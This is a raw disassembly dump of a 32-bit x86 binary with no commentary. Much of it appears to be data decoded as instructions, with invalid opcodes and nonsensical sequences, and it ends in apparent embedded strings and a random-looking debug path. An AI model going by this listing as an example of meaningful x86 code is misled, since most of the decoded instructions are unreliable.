  433183:	lea    ecx,[ebx-0x7617fc44]
  433189:	div    ah
  43318b:	inc    DWORD PTR [ebp+0x45]
  43318e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433194:	jb     0x433121
  433196:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43319d:	mov    ecx,DWORD PTR [ebp-0x10]
  4331a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331a3:	mov    edi,DWORD PTR [ebx]
  4331a5:	adc    BYTE PTR [ebp+0x41],dh
  4331a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331ae:	ret    
  4331af:	push   ss
  4331b0:	push   0x45
  4331b2:	lea    ecx,[ebx+0x4de80cb0]
  4331b8:	sti    
  4331b9:	add    edi,edi
  4331bb:	or     BYTE PTR [ebp+0x4d],al
  4331be:	mov    ebp,DWORD PTR [ebx]
  4331c0:	xor    ebp,ecx
  4331c2:	mov    al,BYTE PTR [edx]
  4331c4:	add    eax,0xc7200
  4331c9:	jne    0x433218
  4331cb:	lea    esi,[ebx]
  4331cd:	mov    al,0xf
  4331cf:	call   0xf2894
  4331d4:	shl    DWORD PTR [ecx],0x84
  4331d7:	pushf  
  4331d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331de:	mov    esi,DWORD PTR [edx]
  4331e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331e7:	test   DWORD PTR [eax],eax
  4331e9:	clc    
  4331ea:	dec    ebp
  4331eb:	inc    ebp
  4331ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4331ef:	pushf  
  4331f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331f7:	lea    eax,[ecx]
  4331f9:	int3   
  4331fa:	add    BYTE PTR [ebp+0x45],cl
  4331fd:	lea    ecx,[ebx-0x75b2cc38]
  433203:	lea    eax,ds:0x4d72c4
  433209:	mov    ecx,DWORD PTR [ebp-0x4]
  43320c:	xor    ecx,edi
  43320e:	bswap  ebx
  433210:	ror    BYTE PTR [ebp-0x35],0xe9
  433214:	rol    DWORD PTR [ecx],0x84
  433217:	add    BYTE PTR [ecx],al
  433219:	xor    eax,DWORD PTR [eax]
  43321b:	pushf  
  43321c:	inc    ebp
  43321d:	jnp    0x8a436620
  433223:	mov    eax,DWORD PTR ds:0xcf72e8
  433229:	lock dec ebp
  43322b:	retf   
  43322c:	xor    ecx,DWORD PTR [ebp+0xf]
  43322f:	mov    eax,eax
  433231:	fmul   st,st(3)
  433233:	test   ecx,0x19b8484
  433239:	xor    al,BYTE PTR [eax]
  43323b:	mov    DWORD PTR [ebp-0x28],eax
  43323e:	mov    eax,DWORD PTR [ebp+0x33]
  433241:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433247:	ret    
  433248:	add    al,cl
  43324a:	dec    ebp
  43324b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433251:	add    ecx,DWORD PTR ds:0xc7250
  433257:	inc    ebp
  433258:	rcl    DWORD PTR [eax+0x4d],0x2b
  43325c:	mov    edi,edi
  43325e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433264:	jb     0x43322d
  433266:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43326d:	mov    esi,DWORD PTR [ebx]
  43326f:	cld    
  433270:	mov    cl,bh
  433272:	or     eax,0x372b6
  433277:	cmp    ecx,eax
  433279:	jne    0x4332f6
  43327f:	mov    eax,DWORD PTR [ebp-0x20]
  433282:	mov    eax,DWORD PTR [eax]
  433284:	xor    eax,edi
  433286:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43328d:	mov    ecx,DWORD PTR [ebp-0x4]
  433290:	mov    ecx,edi
  433292:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433298:	jb     0x4332a9
  43329a:	add    BYTE PTR [edi-0x3f],dl
  43329d:	add    BYTE PTR [ebp-0x75],cl
  4332a0:	mov    esi,eax
  4332a2:	xor    eax,DWORD PTR [eax]
  4332a4:	mov    al,bh
  4332a6:	or     eax,0x4b7284
  4332ab:	xor    al,cl
  4332ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4332b0:	mov    ecx,edi
  4332b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332b8:	jb     0x4332c9
  4332ba:	add    BYTE PTR [edi],dh
  4332bc:	enter  0x8500,0x8b
  4332c0:	add    ah,bl
  4332c2:	add    BYTE PTR [eax],al
  4332c4:	inc    ebp
  4332c5:	(bad)  
  4332c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332cd:	mov    esi,DWORD PTR [edx-0x4]
  4332d0:	add    bh,cl
  4332d2:	dec    ebp
  4332d3:	mov    dh,0x8b
  4332d5:	add    esi,DWORD PTR [ebx]
  4332d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332dd:	add    BYTE PTR [eax],al
  4332df:	mov    eax,ecx
  4332e1:	loopne 0x433330
  4332e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332e9:	dec    ebx
  4332ea:	or     eax,0x8b7232
  4332ef:	in     al,0xc1
  4332f1:	or     DWORD PTR [ebp-0x31],ecx
  4332f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332fb:	xor    dh,BYTE PTR [edx-0x75]
  4332fe:	add    al,dh
  433300:	enter  0x4f09,0xcf
  433304:	inc    ebp
  433305:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43330b:	or     al,BYTE PTR ds:0xe4728b
  433311:	or     DWORD PTR [ebp-0x31],ecx
  433314:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43331b:	cmp    dh,BYTE PTR [edx+0xf]
  43331e:	add    bl,dl
  433320:	rol    DWORD PTR [eax],0x4d
  433323:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433329:	(bad)  
  43332a:	or     eax,0x4b7284
  43332f:	xor    al,cl
  433331:	mov    ecx,DWORD PTR [ebp-0x20]
  433334:	mov    ecx,DWORD PTR [ecx]
  433336:	xor    ecx,edi
  433338:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43333f:	xor    cl,al
  433341:	mov    ecx,DWORD PTR [edi]
  433343:	fadd   QWORD PTR [ebp+0x9]
  433346:	call   0xffd02e1a
  43334b:	dec    ebx
  43334c:	dec    ebp
  43334d:	xor    bh,BYTE PTR [ebx]
  43334f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433353:	loopne 0x433351
  433355:	or     edi,eax
  433357:	iret   
  433358:	ret    
  433359:	mov    WORD PTR [ebp+0x4f],es
  43335c:	mov    esi,DWORD PTR [edx]
  43335e:	call   0x8452fa9d
  433363:	(bad)  
  433364:	fwait
  433365:	add    BYTE PTR [edx],dh
  433367:	mov    esi,DWORD PTR [ebx]
  433369:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43336f:	test   BYTE PTR [ebx],dh
  433371:	dec    ebx
  433372:	add    esi,DWORD PTR [edx]
  433374:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43337a:	dec    edi
  43337c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433383:	xor    al,BYTE PTR [ebx]
  433385:	mov    edi,DWORD PTR [ebx]
  433387:	in     al,0x75
  433389:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43338f:	dec    ebx
  433390:	xor    esi,DWORD PTR [edx]
  433392:	lea    ecx,[edx]
  433394:	or     BYTE PTR [ebx+0x900f072],cl
  43339a:	ja     0x43336b
  43339c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4333a3:	cmp    ch,al
  4333a5:	jne    0x43339a
  4333a7:	mov    edi,edi
  4333a9:	fadd   QWORD PTR [ebp+0x0]
  4333ac:	mov    eax,edi
  4333ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333b5:	mov    edx,DWORD PTR [ebx]
  4333b7:	in     al,0x45
  4333b9:	or     DWORD PTR [ebx],esi
  4333bb:	iret   
  4333bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333c3:	xor    dl,BYTE PTR [eax-0x75]
  4333c6:	sbb    al,0xe0
  4333c8:	dec    DWORD PTR [ecx]
  4333ca:	mov    ecx,edi
  4333cc:	in     al,dx
  4333cd:	mov    eax,es
  4333cf:	dec    ebx
  4333d0:	mov    DWORD PTR [edx],esi
  4333d2:	fmul   QWORD PTR [edx]
  4333d4:	jne    0x433361
  4333d6:	(bad)  
  4333d7:	(bad)  
  4333d9:	or     DWORD PTR [ebp-0x31],eax
  4333dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333e3:	cmp    bh,bh
  4333e5:	jne    0x43342c
  4333e7:	lea    ecx,[ebx-0x38372750]
  4333ed:	inc    ebx
  4333ef:	mov    eax,ecx
  4333f1:	mov    eax,0xa00c111
  4333f6:	jne    0x43343d
  4333f8:	mov    esi,DWORD PTR [ebx]
  4333fa:	test   al,0x3
  4333fc:	inc    ebp
  4333fd:	mov    DWORD PTR [eax-0xc],edx
  433400:	loop   0x433447
  433402:	push   DWORD PTR [ebx]
  433404:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43340a:	add    DWORD PTR [eax],eax
  43340c:	mov    eax,edi
  43340e:	lods   al,BYTE PTR ds:[esi]
  43340f:	dec    ebp
  433410:	inc    ebp
  433411:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433417:	retf   
  433418:	mov    edx,ecx
  43341a:	adc    al,0x84
  43341c:	(bad)  
  43341d:	std    
  43341e:	ret    
  43341f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433425:	hlt    
  433426:	rol    edi,0x82
  433429:	ret    
  43342a:	cld    
  43342b:	enter  0x11ff,0x45
  43342f:	inc    ebp
  433430:	pop    edi
  433431:	mov    ebx,DWORD PTR [ebx+0x14]
  433434:	ret    0xc7
  433437:	test   BYTE PTR [ebx+0x4532519b],cl
  43343d:	jmp    0x4333ca
  43343f:	push   0x8
  433441:	call   DWORD PTR [esi]
  433443:	in     al,dx
  433444:	add    BYTE PTR [ebp+0x1],0x50
  433448:	add    bh,ah
  43344a:	add    bh,bh
  43344c:	icebp  
  43344d:	mov    ecx,DWORD PTR [eax]
  43344f:	cld    
  433450:	pop    es
  433451:	dec    ebp
  433452:	shl    DWORD PTR [ebx],0x72
  433455:	add    eax,DWORD PTR [eax]
  433457:	cmp    edx,ecx
  433459:	je     0x43346b
  43345b:	mov    esi,DWORD PTR [ebp-0x4]
  43345e:	inc    edi
  433460:	or     al,0xc3
  433462:	jmp    FWORD PTR [edx-0x18]
  433465:	(bad)  
  433466:	sti    
  433467:	cwde   
  433468:	(bad)  
  433469:	call   0xffa12d74
  43346e:	or     al,0x45
  433470:	push   ebp
  433471:	sub    esp,0x18
  433474:	push   ebx
  433475:	inc    ebp
  433476:	mov    edi,edi
  433478:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43347f:	test   al,0x54
  433481:	inc    ebp
  433482:	push   ecx
  433483:	push   eax
  433484:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43348a:	add    ah,bh
  43348c:	(bad)  
  43348d:	dec    ebp
  43348e:	add    DWORD PTR [ebx],esi
  433490:	inc    ebp
  433491:	add    ecx,DWORD PTR [ebx+0x74943b]
  433497:	push   0xffffff8b
  433499:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43349f:	add    eax,DWORD PTR [ecx]
  4334a1:	or     BYTE PTR [eax],al
  4334a3:	call   0xff852ca8
  4334a8:	mov    eax,DWORD PTR [ebp+0x14]
  4334ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334b1:	inc    ebp
  4334b2:	dec    ecx
  4334b3:	add    ebp,DWORD PTR [edx+0x14]
  4334b6:	push   0x8b3045
  4334bb:	call   0x33ad8230
  4334c0:	inc    DWORD PTR [ebx]
  4334c2:	mov    DWORD PTR [edi],ecx
  4334c4:	mov    eax,ecx
  4334c6:	or     BYTE PTR [ebp-0x3d],cl
  4334c9:	cmp    eax,edi
  4334cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334d6:	adc    al,0xc9
  4334d8:	inc    ebp
  4334d9:	adc    BYTE PTR [eax+0x55],dl
  4334dc:	jne    0x4334ca
  4334de:	call   0xff54346e
  4334e3:	dec    ebp
  4334e4:	inc    ebp
  4334e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334eb:	add    BYTE PTR [ebx],bh
  4334ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334f1:	push   esp
  4334f2:	or     al,0x51
  4334f4:	dec    ebp
  4334f5:	xor    DWORD PTR [ebx],0xf32039b
  4334fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4334fe:	mov    edi,edi
  433500:	pop    edi
  433501:	adc    BYTE PTR [ebx+0x75],bl
  433504:	ret    0x50
  433507:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43350b:	(bad)  
  43350c:	clc    
  43350d:	mov    esp,ebp
  43350f:	pop    ecx
  433510:	mov    ecx,0xf80085c2
  433515:	mov    ecx,DWORD PTR [ecx+edx*2]
  433518:	push   esi
  433519:	push   esi
  43351a:	(bad)  
  43351b:	lock add DWORD PTR [ebp+0x44],eax
  43351f:	mov    edx,DWORD PTR [eax]
  433521:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433525:	or     BYTE PTR [edi+eax*1+0x51],dl
  433529:	ret    
  43352a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433530:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433536:	or     al,0x80
  433538:	jge    0x43353b
  43353a:	mov    DWORD PTR [eax],eax
  43353c:	and    al,0x8
  43353e:	cmp    DWORD PTR [ebp+0x10],eax
  433541:	mov    edx,DWORD PTR [esi]
  433543:	xchg   esp,eax
  433544:	dec    esp
  433545:	add    BYTE PTR [eax],dl
  433547:	mov    ecx,edx
  433549:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43354d:	dec    ebp
  43354e:	into   
  43354f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433555:	mov    edx,DWORD PTR [eax+0x14]
  433558:	das    
  433559:	add    al,0x45
  43355b:	add    BYTE PTR [ebp+0x0],dh
  43355e:	mov    edi,edi
  433560:	and    al,0x50
  433562:	mov    eax,DWORD PTR [eax]
  433564:	and    al,0xd1
  433566:	xor    eax,DWORD PTR [esi]
  433568:	lea    eax,[ebp+0x8]
  43356b:	xor    esi,DWORD PTR [edx+0x3]
  43356e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433574:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43357a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433584:	cmp    al,0xff
  433586:	pushf  
  433587:	mov    edi,edi
  433589:	or     BYTE PTR [esi+ecx*1],cl
  43358c:	jne    0x433551
  43358e:	call   0xc355a
  433593:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433597:	mov    ebx,DWORD PTR [eax]
  433599:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43359d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335a5:	pop    esi
  4335a6:	and    al,0xc9
  4335a8:	call   DWORD PTR [eax]
  4335aa:	and    al,0x55
  4335ac:	call   0x28349d
  4335b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4335b6:	clc    
  4335b7:	pushf  
  4335b8:	dec    DWORD PTR [ecx+0x57892474]
  4335be:	jmp    0x433601
  4335c0:	and    al,0x89
  4335c2:	and    al,0x24
  4335c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4335ca:	dec    DWORD PTR [eax]
  4335cc:	and    al,0x7
  4335ce:	pop    esi
  4335cf:	cli    
  4335d0:	in     eax,0x9b
  4335d2:	ret    0x32
  4335d5:	add    eax,edx
  4335d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4335dd:	or     al,0xf8
  4335df:	jl     0x43365e
  4335e1:	adc    al,0x9c
  4335e3:	dec    ebp
  4335e4:	push   0xff8b7575
  4335e9:	and    al,0xff
  4335eb:	xor    edi,edi
  4335ed:	mov    esi,DWORD PTR [esp-0x75]
  4335f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4335f7:	or     bl,ch
  4335f9:	cmp    DWORD PTR [eax],edx
  4335fb:	sbb    al,0x44
  4335fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433601:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433608:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43360f:	test   eax,0x83001010
  433614:	dec    eax
  433615:	adc    BYTE PTR [eax],al
  433617:	adc    edi,DWORD PTR [edx+0x10]
  43361a:	add    cl,bh
  43361c:	jae    0x43362e
  43361e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433624:	pop    eax
  433625:	adc    BYTE PTR [eax],al
  433627:	fidiv  DWORD PTR [ebp+0x10]
  43362a:	add    dh,bl
  43362c:	movups xmm0,XMMWORD PTR [eax]
  43362f:	popf   
  433630:	push   cs
  433631:	adc    BYTE PTR [eax],al
  433633:	ins    DWORD PTR es:[edi],dx
  433634:	or     BYTE PTR [eax],dl
  433636:	add    BYTE PTR [ebx+eiz*2+0x360f0010],cl
  43363d:	inc    ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [edi],ah
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ebx],ch
  433658:	ss inc ebx
  43365a:	add    BYTE PTR [edi],ch
  43365c:	ss inc ebx
  43365e:	add    BYTE PTR [ebx],dh
  433660:	ss inc ebx
  433662:	add    BYTE PTR [edi],dh
  433664:	ss inc ebx
  433666:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43366c:	cmp    al,0x10
  43366e:	add    BYTE PTR [ebx+0x30],cl
  433671:	adc    BYTE PTR [eax],al
  433673:	sub    al,0xc
  433675:	adc    BYTE PTR [eax],al
  433677:	push   ds
  433678:	adc    BYTE PTR ds:[eax],al
  43367b:	mov    bh,0x56
  43367d:	adc    BYTE PTR [eax],al
  43367f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433683:	cmp    al,0x4f
  433685:	adc    BYTE PTR [eax],al
  433687:	addr16 ss inc ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [edi+0x36],dh
  433699:	inc    ebx
  43369a:	add    BYTE PTR [ebx+0x36],bh
  43369d:	inc    ebx
  43369e:	add    BYTE PTR [edi+0x36],bh
  4336a1:	inc    ebx
  4336a2:	add    BYTE PTR [ebx-0x23ffbcca],al
  4336a8:	pop    esp
  4336a9:	adc    BYTE PTR [eax],al
  4336ab:	jle    0x4336cd
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cld    
  4336b0:	dec    edx
  4336b1:	adc    BYTE PTR [eax],al
  4336b3:	add    al,0xb
  4336b5:	adc    BYTE PTR [eax],al
  4336b7:	push   ebx
  4336b8:	ins    DWORD PTR es:[edi],dx
  4336b9:	adc    BYTE PTR [eax],al
  4336bb:	fs jl  0x4336ce
  4336be:	add    BYTE PTR [edx+0x42001015],ah
  4336c4:	jge    0x4336d6
  4336c6:	add    BYTE PTR [edi-0x54ffbcca],ah
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [edi-0x4cffbcca],ch
  4336d4:	ss inc ebx
  4336d6:	add    BYTE PTR [edi-0x44ffbcca],dh
  4336dc:	ss inc ebx
  4336de:	add    BYTE PTR [edi-0x3cffbcca],bh
  4336e4:	ss inc ebx
  4336e6:	add    BYTE PTR [edi+0x2300103a],ah
  4336ec:	aas    
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jne    0x4336fc
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	fldenv [esi]
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xchg   esp,eax
  4336f8:	push   0x10
  4336fa:	add    bl,ah
  4336fc:	pop    eax
  4336fd:	adc    BYTE PTR [eax],al
  4336ff:	in     al,0x2f
  433701:	adc    BYTE PTR [eax],al
  433703:	leave  
  433704:	sbb    DWORD PTR [eax],edx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    bh,dh
  433718:	ss inc ebx
  43371a:	add    bl,bh
  43371c:	ss inc ebx
  43371e:	add    bh,bh
  433720:	ss inc ebx
  433722:	add    BYTE PTR [ebx],al
  433724:	aaa    
  433725:	inc    ebx
  433726:	add    BYTE PTR [ebp+0x1d001062],bh
  43372c:	adc    BYTE PTR [eax],dl
  43372e:	add    BYTE PTR [edi+0x51],dl
  433731:	adc    BYTE PTR [eax],al
  433733:	dec    eax
  433734:	ins    DWORD PTR es:[edi],dx
  433735:	adc    BYTE PTR [eax],al
  433737:	mov    eax,DWORD PTR [edi]
  433739:	adc    BYTE PTR [eax],al
  43373b:	mov    ah,0x7
  43373d:	adc    BYTE PTR [eax],al
  43373f:	ror    DWORD PTR [esi],1
  433741:	adc    BYTE PTR [eax],al
  433743:	pop    edi
  433744:	inc    ebp
  433745:	adc    BYTE PTR [eax],al
  433747:	daa    
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [edi],dh
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [ebx],bh
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [edi],bh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [ebx+0x37],al
  433765:	inc    ebx
  433766:	add    BYTE PTR [ecx+0x36],cl
  433769:	push   eax
  43376a:	pop    edi
  43376b:	ss inc ebx
  43376d:	ss pop edx
  43376f:	xor    ebx,DWORD PTR [edi+0x52]
  433772:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433776:	pop    edi
  433777:	dec    esi
  433778:	dec    esp
  433779:	dec    eax
  43377a:	xor    esi,DWORD PTR [edx]
  43377c:	pop    edi
  43377d:	xor    al,0x4b
  43377f:	add    BYTE PTR [eax+0x49],cl
  433782:	push   ebp
  433783:	xor    al,0x5f
  433785:	dec    esp
  433786:	inc    edx
  433787:	dec    ecx
  433788:	cmp    DWORD PTR [edi+ebx*2],esi
  43378b:	pop    ecx
  43378c:	inc    edi
  43378d:	add    BYTE PTR [eax+0x50],bl
  433790:	dec    eax
  433791:	pop    edi
  433792:	push   ebp
  433793:	push   ecx
  433794:	inc    edi
  433795:	xor    cl,BYTE PTR [edx+0x38]
  433798:	push   esi
  433799:	add    BYTE PTR [ebx+0x4a],al
  43379c:	push   edx
  43379d:	pop    edi
  43379e:	dec    edi
  43379f:	dec    eax
  4337a0:	dec    edi
  4337a1:	dec    edi
  4337a2:	dec    edx
  4337a3:	add    BYTE PTR [ecx+0x52],al
  4337a6:	cmp    DWORD PTR [edi+0x56],ebx
  4337a9:	aaa    
  4337aa:	dec    esp
  4337ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ae:	push   edx
  4337af:	inc    esp
  4337b0:	add    BYTE PTR [ecx+0x37],bl
  4337b3:	inc    esp
  4337b4:	pop    edi
  4337b5:	dec    ecx
  4337b6:	xor    esi,DWORD PTR [edi]
  4337b8:	xor    DWORD PTR [edi+0x49],ebx
  4337bb:	push   esp
  4337bc:	xor    eax,DWORD PTR [eax]
  4337be:	push   edx
  4337bf:	xor    BYTE PTR [eax+0x5f],bl
  4337c2:	dec    eax
  4337c3:	push   edi
  4337c4:	inc    esi
  4337c5:	xor    DWORD PTR [edi+0x5f],edx
  4337c8:	cmp    BYTE PTR [ebx+0x37],dl
  4337cb:	add    BYTE PTR [esi+0x42],dl
  4337ce:	dec    ecx
  4337cf:	xor    ebx,DWORD PTR [edi+0x45]
  4337d2:	xor    BYTE PTR [ebp+0x5f],cl
  4337d5:	xor    al,0x34
  4337d7:	xor    BYTE PTR [edx+0x5f],cl
  4337da:	inc    edi
  4337db:	add    BYTE PTR [edx+0x57],dl
  4337de:	xor    ebx,DWORD PTR [edi+0x31]
  4337e1:	dec    edx
  4337e2:	push   edi
  4337e3:	xor    eax,0x4d435f
  4337e8:	dec    ecx
  4337e9:	xor    eax,0x36365f39
  4337ee:	dec    eax
  4337ef:	xor    BYTE PTR [eax],al
  4337f1:	dec    edi
  4337f2:	inc    ebx
  4337f3:	push   edi
  4337f4:	pop    edi
  4337f5:	inc    edi
  4337f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4337fb:	add    BYTE PTR [edx+0x0],al
  4337fe:	pop    eax
  4337ff:	add    BYTE PTR [edi+0x0],al
  433802:	add    BYTE PTR ss:[edi+0x0],bl
  433806:	push   esi
  433807:	add    BYTE PTR [ebx+0x0],al
  43380a:	dec    esi
  43380b:	add    BYTE PTR [eax+eax*1+0x0],al
  43380f:	add    BYTE PTR [edi+0x0],cl
  433812:	dec    ebp
  433813:	add    BYTE PTR [edi+0x0],al
  433816:	xor    eax,DWORD PTR [eax]
  433818:	pop    edi
  433819:	add    BYTE PTR [eax+eax*1],dh
  43381c:	dec    esi
  43381d:	add    BYTE PTR [edx+0x0],bl
  433820:	cmp    BYTE PTR [eax],al
  433822:	pop    edi
  433823:	add    BYTE PTR [eax+0x0],bl
  433826:	cmp    BYTE PTR [eax],al
  433828:	add    BYTE PTR [eax],al
  43382a:	push   edx
  43382b:	add    BYTE PTR [eax+0x0],bl
  43382e:	push   ecx
  43382f:	add    BYTE PTR [edi+0x0],bl
  433832:	dec    esp
  433833:	add    BYTE PTR [edx+0x0],dl
  433836:	dec    ecx
  433837:	add    BYTE PTR [edi+0x0],cl
  43383a:	inc    esp
  43383b:	add    BYTE PTR [edi+0x0],bl
  43383e:	dec    edi
  43383f:	add    BYTE PTR [ebx],dh
  433841:	add    BYTE PTR [eax+eax*1+0x0],al
  433845:	add    BYTE PTR [ebx+0x0],al
  433848:	push   eax
  433849:	add    BYTE PTR [ebp+0x0],al
  43384c:	pop    edi
  43384d:	add    BYTE PTR ds:0x39004500,dh
  433853:	add    BYTE PTR [edi+0x0],bl
  433856:	push   esi
  433857:	add    BYTE PTR [eax],al
  433859:	add    BYTE PTR [edi+0x0],al
  43385c:	dec    esi
  43385d:	add    BYTE PTR [esi+0x0],dl
  433860:	pop    edi
  433861:	add    BYTE PTR [edi+0x0],al
  433864:	push   esp
  433865:	add    BYTE PTR [eax+0x0],cl
  433868:	xor    al,BYTE PTR [eax]
  43386a:	xor    DWORD PTR [eax],eax
  43386c:	pop    edi
  43386d:	add    BYTE PTR [edi+0x0],cl
  433870:	add    BYTE PTR ss:[ebx],dh
  433873:	add    BYTE PTR [eax],al
  433875:	add    BYTE PTR [eax+eax*1+0x45],al
  433879:	add    BYTE PTR [ecx+0x0],cl
  43387c:	pop    edi
  43387d:	add    BYTE PTR [edx+0x0],dl
  433880:	dec    eax
  433881:	add    BYTE PTR [eax+eax*1],dh
  433884:	dec    eax
  433885:	add    BYTE PTR [eax],al
  433887:	add    BYTE PTR [eax],al
  433889:	push   edx
  43388a:	push   ebx
  43388b:	inc    esp
  43388c:	push   ebx
  43388d:	ds aad 0xb7
  433890:	gs pushf 
  433892:	ja     0x4338d2
  433894:	dec    esi
  433895:	sahf   
  433896:	arpl   WORD PTR [esp+eiz*4+0x6e1ffbd1],si
  43389d:	push   cs
  43389e:	add    BYTE PTR [eax],al
  4338a0:	add    BYTE PTR [ecx+0x3a],dl
  4338a3:	pop    esp
  4338a4:	js     0x4338fe
  4338a6:	ins    DWORD PTR es:[edi],dx
  4338a7:	arpl   WORD PTR [esi+0x76],sp
  4338aa:	addr16 jp 0x433921
  4338ad:	pop    esp
  4338ae:	inc    ebp
  4338af:	inc    esi
  4338b0:	dec    edx
  4338b1:	bound  ebp,QWORD PTR [edx+0x67]
  4338b4:	popa   
  4338b5:	push   0x6c776a5c
  4338ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4338be:	popa   
  4338bf:	bound  esi,QWORD PTR [edi+0x65]
  4338c2:	cs jo  0x433929
  4338c5:	bound  eax,QWORD PTR [eax]
	...
